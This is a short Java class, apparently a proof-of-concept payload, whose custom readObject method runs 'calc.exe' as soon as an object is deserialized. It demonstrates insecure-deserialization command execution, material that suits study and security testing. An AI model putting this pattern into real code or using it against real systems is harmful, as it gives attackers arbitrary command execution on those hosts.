package com.example.springSec.Payload;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class DemoSerialize implements Serializable {

    private String test;

    public DemoSerialize(String test){
        this.test = test;
    }


    
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec("calc.exe");
    }
}
